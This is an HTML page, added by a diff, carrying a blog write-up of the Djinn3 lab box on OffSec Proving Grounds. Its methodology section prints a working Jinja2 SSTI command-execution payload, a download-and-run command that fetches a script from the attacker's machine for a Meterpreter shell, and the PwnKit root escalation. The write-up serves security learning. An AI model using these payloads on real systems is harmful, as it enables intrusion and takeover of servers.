@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Djinn3 Pentest Writeup - 18gi0n's Tech Lair</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .opaque-bg {
+            background-color: rgba(13, 13, 13, 0.6);
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+
+        .content .left-aligned-content {
+            text-align: left !important;
+            max-width: 800px;
+            margin: 0 20px !important;
+            padding: 20px 0 !important;
+        }
+
+        .content .left-aligned-content h1,
+        .content .left-aligned-content h2,
+        .content .left-aligned-content p,
+        .content .left-aligned-content ul,
+        .content .left-aligned-content ol,
+        .content .left-aligned-content li {
+            text-align: left !important;
+        }
+
+        .content .left-aligned-content a {
+            color: #ff9933 !important;
+            text-decoration: underline;
+        }
+
+        .content .left-aligned-content a:hover {
+            color: #ff007a !important;
+            text-shadow: 0 0 5px #ff007a;
+        }
+
+        .content .left-aligned-content img {
+            margin: 20px 0 !important;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .content .left-aligned-content {
+                margin: 0 10px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Nav Bar -->
+    <nav>
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="/about.html">About</a></li>
+            <li><a href="/projects.html">Projects</a></li>
+            <li><a href="/code.html">Code & Tools</a></li>
+            <li><a href="/ctf.html">Write-ups</a></li>
+            <li><a href="/research.html">Research</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="opaque-bg" id="opaqueBg"></div>
+    <div class="content">
+        <div class="left-aligned-content">
+            <h1>Djinn3 Pentest Writeup - OffSec Proving Grounds</h1>
+
+            <h2>1. Box Overview</h2>
+            <img src="/assets/images/ctf/Djin3/finish.png" alt="title">
+            <p>
+                I recently tackled Djinn3 on OffSec Proving Grounds, and it was a challenging but exciting experience. This Linux machine, marked as ‘hard,’ required capturing two flags—one as a low-privileged user and another as root. The journey involved exploiting a Server-Side Template Injection (SSTI) vulnerability in a Flask web app to gain a shell, followed by privilege escalation using the PwnKit exploit. It pushed my skills in enumeration, vulnerability research, and privilege escalation to the limit.
+            </p>
+            <ul>
+                <li><strong>Objective:</strong> Gain initial access, escalate privileges, and capture the user and root flags.</li>
+                <li><strong>Skills Developed:</strong> Nmap scanning, SSTI exploitation, reverse shell delivery, privilege escalation with LinPEAS and PwnKit.</li>
+                <li><strong>Platform:</strong> OffSec Proving Grounds</li>
+            </ul>
+
+            <h2>2. Resources Used</h2>
+            <p>Here are the resources that supported me during this challenge:</p>
+            <ul>
+                <li>
+                    <strong>SSTI Reference:</strong><br>
+                    Title: <a href="https://skf.gitbook.io/asvs-write-ups/server-side-template-injection-ssti/server-side-template-injection">ASVS Writeups - Server-Side Template Injection</a><br>
+                    Usage: Helped me understand SSTI payloads and test for vulnerabilities in the ticket system.
+                </li>
+            </ul>
+
+            <h2>3. My Approach to Solving Djinn3</h2>
+            <p>Let’s break down the steps I took to conquer this box, from initial recon to capturing the flags.</p>
+
+            <h3>Recon with Nmap</h3>
+            <p>
+                I started by running an Nmap scan to identify open ports and services on the target at <code>192.168.163.102</code>. I used the command <code>nmap -sV -T4 -p- --open</code>. I prefer this setup for quick scans when I’m not concerned about detection—the <code>-T4</code> speeds things up, <code>-p-</code> scans all ports, and <code>--open</code> filters for open ones to save time. The <code>-sV</code> flag is crucial for detecting service versions, which can hint at potential vulnerabilities.
+            </p>
+            <p>
+                The scan revealed three open ports: 80 (running Nginx), 5000 (a Flask web app), and 31337 (a custom service). Port 80 seemed like a typical web server, but ports 5000 and 31337 caught my attention as potential entry points for something more interesting.
+            </p>
+            <img src="/assets/images/ctf/Djin3/nmap.png" alt="Nmap scan results">
+
+            <h3>Exploring the Web Services</h3>
+            <p>
+                I first visited the web server on port 80 by entering the target’s IP in my browser. It was just a basic homepage with no obvious functionality, so I moved on to port 5000. There, I found a ticketing software page displaying a couple of tickets with statuses and links for more details. The tickets were being pulled dynamically via URLs like <code>/?id=*</code>, which hinted at a possible injection point.
+            </p>
+            <img src="/assets/images/ctf/Djin3/honeypot.png" alt="honeypot">
+            <img src="/assets/images/ctf/Djin3/ticket pagfe.png" alt="ticketing_page">
+            <p>
+                To gather more intel, I started digging into the ticket content and noticed mentions of usernames. I created a <code>users.txt</code> file to compile all the names I found, thinking they might come in handy for brute-forcing or authentication later.
+            </p>
+            <img src="/assets/images/ctf/Djin3/usernames.png" alt="ticketing">
+
+            <h3>Testing Port 31337 for Access</h3>
+            <p>
+                Before diving deeper into the web app, I decided to check out the service on port 31337. I first tried connecting with <code>telnet</code>, but got no response. Then I used <code>nc 192.168.163.102 31337</code>, and this time I got a prompt asking for a username and password. While reviewing the tickets, I’d noticed one mentioning that the guest profile was still enabled. So, I tested a few combos with guest as username and finally got to combo <code>guest:guest</code> and to my surprise, it worked! I was logged into the service on port 31337.
+            </p>
+            <img src="/assets/images/ctf/Djin3/nc over 31337.png" alt="nc">
+            <img src="/assets/images/ctf/Djin3/default user gues in ticket.png" alt="guest user">
+
+            <h3>Identifying SSTI in the Ticketing System</h3>
+            <p>
+                Back on port 5000, I created a new ticket to see how the system handled input. First, I tested for XSS by submitting a basic script, and it executed perfectly, confirming the system was vulnerable to client-side attacks. That got me thinking about server-side vulnerabilities, so I tried a simple Server-Side Template Injection (SSTI) payload in the browser URL: <code>{{ 2 + 2 }}</code>. I referenced a guide on SSTI exploitation, which helped me understand how to test for this vulnerability.
+            </p>
+            <img src="/assets/images/ctf/Djin3/SSTI fail.png" alt="fail">
+            <p>
+                The URL test didn’t yield much, so I tried the same payload in the description field of a new ticket. This time, it worked—the output showed <code>2</code>, confirming SSTI. I attempted various commands, but only mathematical operations succeeded initially. After some trial and error, I found a payload that allowed command execution: <code>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</code>. This executed the <code>id</code> command, confirming I could run Linux commands on the server.
+            </p>
+            <img src="/assets/images/ctf/Djin3/SSTI.png" alt="cmd">
+            <img src="/assets/images/ctf/Djin3/SSTI results.png" alt="results">
+
+            <h3>Struggling with Reverse Shells</h3>
+            <p>
+                With command execution confirmed, I wanted a proper shell. I tried a few Python and Bash reverse shells from a shell generator, but none connected to my Netcat listener. After some frustration, I turned to Metasploit and used the <code>web_delivery</code> module for Linux. It generated a command to download and execute a script: <code>wget -qO f8KtIViN --no-check-certificate http://192.168.45.169:8087/2ydWs5e9; chmod +x f8KtIViN; ./f8KtIViN& disown</code>.
+            </p>
+            <img src="/assets/images/ctf/Djin3/guest guest.png" alt="reverse shell">
+            <p>
+                I injected this into the SSTI template: <code>{{request.application.__globals__.__builtins__.__import__('os').popen('wget -qO f8KtIViN --no-check-certificate http://192.168.45.169:8087/2ydWs5e9; chmod +x f8KtIViN; ./f8KtIViN& disown').read()}}</code>. After setting up the Metasploit listener, I submitted the ticket, and a Meterpreter shell dropped as <code>www-data</code>. I was finally on the box!
+            </p>
+            <img src="/assets/images/ctf/Djin3/meterpert1.png" alt="meterpert1">
+
+            <h3>Capturing the First Flag</h3>
+            <p>
+                As <code>www-data</code>, I started enumerating the system. I navigated to <code>/var/www</code> and found a file named <code>local.txt</code>. When I opened it with <code>cat</code>, I was excited to see it contained the first flag. One down, one to go!
+            </p>
+            <img src="/assets/images/ctf/Djin3/cat.local.txt.png" alt="local.txt">
+
+            <h3>Privilege Escalation with LinPEAS and PwnKit</h3>
+            <p>
+                A coworker had been recommending LinPEAS for privilege escalation, so I decided to give it a try. I started a Python web server on my attacking machine with <code>python3 -m http.server 8000</code> and transferred LinPEAS to the target using <code>wget http://192.168.45.169:8000/linpeas.sh</code>. I made it executable with <code>chmod +x linpeas.sh</code> and ran it.
+            </p>
+            <img src="/assets/images/ctf/Djin3/linpeas_tranfer&run.png" alt="transfer linpease.sh">
+            <p>
+                LinPEAS highlighted several potential vulnerabilities, but the standout was the PwnKit exploit, which targets a flaw in <code>pkexec</code>. I opened Metasploit, searched for PwnKit with <code>search pwnkit</code>, and selected the <code>exploit/linux/local/cve_2021_4034_pwnkit_lpe</code> module, which was for x86_64. I set the payload to <code>linux/x64/meterpreter/reverse_tcp</code>, configured the options, and ran the post-exploit module. Within moments, I had a new Meterpreter session as root!
+            </p>
+            <img src="/assets/images/ctf/Djin3/pwnkit_linpeas.png" alt="pwnkit_linpeas">
+            <img src="/assets/images/ctf/Djin3/meterpeter_root.png" alt="root">
+
+            <h3>Securing the Root Flag</h3>
+            <p>
+                With root access, I navigated to <code>/root</code> and found the final flag in a file. I opened it with <code>cat</code>, and that was it—Djinn3 was complete! It felt incredibly rewarding to overcome the challenges and capture both flags.
+            </p>
+
+            <h2>5. Challenges Faced</h2>
+            <p>I encountered several hurdles during this challenge:</p>
+            <ul>
+                <li><strong>Identifying the Template Engine:</strong> Figuring out the template engine was tricky since normal fuzzing didn’t reveal errors. I had to research likely engines (like Flask/Jinja2) and work backward to find a working SSTI payload.</li>
+                <li><strong>Finding the Right SSTI Injection:</strong> Many SSTI attempts failed until I found the right command execution payload—it required persistence and experimentation.</li>
+                <li><strong>Choosing the Right Payload:</strong> Reverse shells were a struggle; Python and Bash payloads didn’t connect, and I had to pivot to Metasploit’s web delivery module to succeed.</li>
+                <li><strong>Privilege Escalation:</strong> Identifying the best priv esc vector took time, but LinPEAS made it manageable by pointing me to PwnKit.</li>
+            </ul>
+
+            <h2>6. Lessons Learned and Tips</h2>
+            <p>Here’s what I took away from Djinn3:</p>
+            <ul>
+                <li><strong>Tip 1:</strong> Research the template engine before diving into SSTI attacks. Don’t go in blind—understand the likely engine (e.g., Flask/Jinja2) and tailor your payloads accordingly.</li>
+                <li><strong>Tip 2:</strong> Keep trying different payloads! Just because one exploit or shell doesn’t work doesn’t mean another won’t. Research why some payloads succeed while others fail—it’s a great learning opportunity.</li>
+                <li><strong>Key Lesson:</strong> Tools like LinPEAS are invaluable for privilege escalation. They can quickly highlight vulnerabilities like PwnKit, saving you hours of manual enumeration.</li>
+                <li><strong>Future Goals:</strong> I want to deepen my understanding of SSTI across different template engines and explore more privilege escalation techniques using tools like Metasploit.</li>
+            </ul>
+
+            <h2>7. Conclusion</h2>
+            <p>
+                Djinn3 was a tough but enriching challenge that tested my pentesting skills at every step. From identifying an SSTI vulnerability in the Flask app to gaining a shell with Metasploit’s web delivery module, and finally escalating to root with the PwnKit exploit, the journey was full of learning opportunities. The SSTI exploitation and privilege escalation phases were particularly rewarding, as they pushed me to think critically and adapt my approach. I’m excited to apply these lessons to future challenges!
+            </p>
+
+            <h2>8. Additional Notes</h2>
+            <ul>
+                <li>I referenced a detailed walkthrough for additional insights on SSTI exploitation: <a href="https://github.com/robinpaulpeluri/DC4-Vulnhub-Walkthrough">DC4-Vulnhub-Walkthrough</a>.</li>
+                <li>The ASVS Writeups guide on SSTI was crucial for understanding how to craft effective payloads.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically set the height of opaque-bg to match the document height
+        function setOpaqueBgHeight() {
+            const opaqueBg = document.getElementById('opaqueBg');
+            const docHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            );
+            opaqueBg.style.height = `${docHeight - 50}px`;
+        }
+
+        window.addEventListener('load', setOpaqueBgHeight);
+        window.addEventListener('resize', setOpaqueBgHeight);
+    </script>
+</body>
+</html>
